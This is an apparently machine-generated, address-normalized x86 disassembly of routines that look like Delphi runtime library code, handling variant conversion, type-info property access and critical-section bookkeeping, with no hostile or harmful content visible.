mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40edf8
retn
sub_40fb74
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4100c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fbae ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4047d4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404688
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047d4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4094e4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047d4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4094e4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4047d4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f164
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4046c4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f19c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4046c4
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404798
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404884
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40f1d4
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4046c4
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407f50
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40803c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4047d4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_40803c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fb74
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f990
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4046c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4100cd
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4046a0
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403fcc
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4046a0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403fcc
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4046a0
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403fcc
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4046a0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fcc
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40fa48
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4046c4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4047d4
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e698
test ah 0x40
je r-xdata
mov eax esi
call sub_404688
mov edx eax
mov eax ebx
call sub_40faac
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f990
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4046c4
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f990
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4046c4
jmp r-xdata
jmp [ eax * 4 + jump_table_40fe35 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4094e4
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4094e4
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40f164
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4046c4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f19c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4046c4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f1d4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4046c4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4047d4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f50
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_40803c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_40803c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4047d4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fb74
jmp r-xdata
sub_4100d4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ed7c
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_410110
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40ed7c
sub_41013c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40ed7c
sub_4101a0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ffc
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed7c
sub_4101cc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404884
pop esi
pop ebx
retn
mov eax ebx
call sub_40ed7c
sub_410388
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4104ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403ffc
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403ffc
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4107e4
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403ffc
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042b4
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408064
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4042b4
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40420c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104b5
lea eax [ ebp - 0x208 ]
call sub_403fa8
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042b4
sub_410530
[ eax - 0x1f ]
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
xor al 0xff
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4107e4
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410764
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_410540
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4105a1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404e1c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4105a8
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403258
sub_4105f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410764
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4107e4
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410644
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41067c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410764
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4106b8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035e4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41071b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410722
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4107bc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4107e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41088c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404e1c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_41089c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_410972
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410955
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404e24
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41095c
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031a8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40420c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407d1c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_41098c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4109fb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a02
retn
call sub_410540
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404fe4
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a30
mov eax rw-data
call sub_403fa8
mov eax rw-data
call sub_40ee0c
sub_410a04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410aa5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410aac
retn
mov eax rw-data
call sub_410510
mov eax sub_40eb0c
mov [ rw-data ] eax
mov eax sub_40e734
mov [ rw-data ] eax
mov edx sub_40e644
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ee0c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_410204
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f120
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f44c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fb74
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410ab0
push esi
inc edi
add [ ebp + 0x640000ff ] ch
push esi
inc edi
add [ esi + 0x640000ff ] ch
push esi
inc edi
add [ edi + 0x640000ff ] ch
push esi
inc edi
add [ eax + 0x640000ff ] dl
push esi
inc edi
add [ ecx + 0x640000ff ] dl
push esi
inc edi
add [ edx + 0x640000ff ] dl
push esi
inc edi
add [ ebx + 0x640000ff ] dl
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] dl
inc edi
add [ ebp + 0x640000ff ] dl
push esi
inc edi
add [ esi + 0x640000ff ] dl
push esi
inc edi
add [ edi + 0x640000ff ] dl
push esi
inc edi
add [ eax + 0x640000ff ] bl
push esi
inc edi
add [ ecx + 0x640000ff ] bl
push esi
inc edi
add [ edx + 0x640000ff ] bl
push esi
inc edi
add [ ebx + 0x640000ff ] bl
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] bl
inc edi
add [ ebp + 0x640000ff ] bl
push esi
inc edi
add [ esi + 0x640000ff ] bl
push esi
inc edi
add [ edi + 0x640000ff ] bl
push esi
inc edi
add [ eax + 0x640000ff ] al
push esi
inc edi
add [ ecx + 0x640000ff ] al
push esi
inc edi
add [ edx + 0x640000ff ] al
push esi
inc edi
add [ ebx + 0x640000ff ] al
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] al
inc edi
add [ ebp + 0x640000ff ] al
push esi
inc edi
add [ esi + 0x640000ff ] al
push esi
inc edi
add [ edi + 0x640000ff ] al
push esi
inc edi
add [ eax + 0x640000ff ] cl
push esi
inc edi
add [ ecx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_410bbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410bc4
retn
sub_410c08
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410c54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410bfc
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_40808c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410c08
mov edx [ rw-data ]
mov eax esi
call sub_407d1c
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407d1c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_40808c
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410cb8
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410d28
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410d9c
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410df8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410e4c
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404244
mov ecx esp
mov edx esi
mov eax ebx
call sub_410df8
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410e94
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410e80
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410ed4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410f1c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047d4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f23
lea eax [ ebp - 0x4 ]
call sub_404688
retn
sub_410f2c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410e4c
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410e94
pop ebx
retn
dec bl
je r-xdata
call sub_410ed4
jmp r-xdata
pop ebx
retn
sub_410f58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41101e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404230
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410f2c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411025
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046c4
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_41102c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_410bfc
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_411074 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4111a3 ]
jmp [ eax * 4 + jump_table_411110 ]
fld [ ebp + 0x8 ]
